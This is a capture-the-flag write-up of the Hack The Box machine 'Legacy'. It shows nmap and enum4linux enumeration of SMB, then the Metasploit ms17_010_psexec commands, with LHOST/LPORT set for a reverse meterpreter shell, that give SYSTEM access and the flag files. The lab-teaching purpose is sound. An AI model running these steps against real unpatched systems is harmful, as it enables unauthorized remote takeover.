# Legacy Write-Up (English Version)
This is my write-up about **Legacy** which is an active Windows machine on **Hack The Box** having the IP Address `10.10.10.4`.

![[img/legacy-card.png]]

## Target Enumeration

### Nmap Initial Scan
---

I first started by doing my usual type of `Nmap` scan, which is a SYN scan, scanning for service version and running the default `NSE script` of `Nmap` 

Note : SYN scan require you to perform the command as `root`

```
 sudo nmap -sSVC -p- 10.10.10.4 -oA nmap/nmap_initial_scan.log
```

![[img/nmap-scan.png]]

<br>

### Nmap Vuln Scan
---

After the scan result, we can see that we only have ports open on some SMB services from windows. So I decided to run a vulnerability scan with `Nmap` to see if the SMB services are exploitable.

```
sudo nmap -script vuln -p- 10.10.10.4 -oA nmap/nmap_vuln_scan.log
```

![[img/nmap-vuln.png]]

We can see that the SMB ports seems to be vulnerable to `ms17-010`, which is good to know so let keep this in mind.

<br>

### Enum4linux
---

When I'm dealing with SMB shares, I usually like run tool like `enum4linux` which can enumerate all the share on a given host and can also do stuff like gathering password policy, enumerate username, etc...

```
┌──(op㉿kali)-[~/htb/Legacy]
└─$ enum4linux -A 10.10.10.4
Unknown option: A
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Sep  7 19:27:45 2021
...
 ================================================== 
|    Enumerating Workgroup/Domain on 10.10.10.4    |
 ================================================== 
[+] Got domain/workgroup name: HTB

 ========================================== 
|    Nbtstat Information for 10.10.10.4    |
 ========================================== 
Looking up status of 10.10.10.4
	LEGACY          <00> -         B <ACTIVE>  Workstation Service
	HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	LEGACY          <20> -         B <ACTIVE>  File Server Service
	HTB             <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
	HTB             <1d> -         B <ACTIVE>  Master Browser
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

	MAC Address = 00-50-56-B9-26-64

...

 ===================================================================== 
|    Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050)    |
 ===================================================================== 
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 =========================================== 
|    Getting printer info for 10.10.10.4    |
 =========================================== 
No printers returned.


enum4linux complete on Tue Sep  7 19:27:57 2021
```

We got two shares that we can possibly log in to with `anonymous` account, so let's try that.

<br>

## Abusing SMB shares
---

That was good to check, but unfortunately I can't seem to be able to login, the connection closed right after it succeed logging is as `anonymous`

![[img/smb-anonymous.png]]

<br>

## Metasploit 

### Msfconsole
---

So since we can't access the share manually, let's check for `ms17-010` in `msfconsole`

```
msfconsole
```

![[img/msfconsole.png]]

Here we want to search for `ms17-010` vulnerability, so we only need to ask our good friend `Metasploit`.

```
msf6 > search ms17-010
```

![[img/search-exploit.png]]

And we can see four results coming up, for this case I will take the second one, since it is not EternalBlue which often fails. We can choose the exploit by typing this in `msfconsole` prompt: 

```
msf6 > use 1
```

We can also type `options` to see the list of options that we can edit in our exploit before sending it to the target machine. In our case we only need to modify three variables: 
 - `LHOST`
 -  `LPORT` 
 -  `RHOSTS`

So let's set the three variables and send the exploit to our target.

```
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.4
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST [YOUR_IP]
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT [YOUR_PORT]
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

And we got ourselves a sweet `meterpreter` shell. We can type `getuid` to know which user we are. As we can see here, we are already `NT AUTHORITY/SYSTEM`.

![[img/meterpreter.png]]

<br>

### Meterpreter Session
---

So let's spawn an OS shell on the target and search for both `root.txt` and `user.txt`.
To do that just go to the root of `C:\` and type the following command :

```
dir /s/b [YOUR_FILE]
```

![[img/proof.png]]

Only need to gather the flag within the files, and we are now done with this box that we have just owned.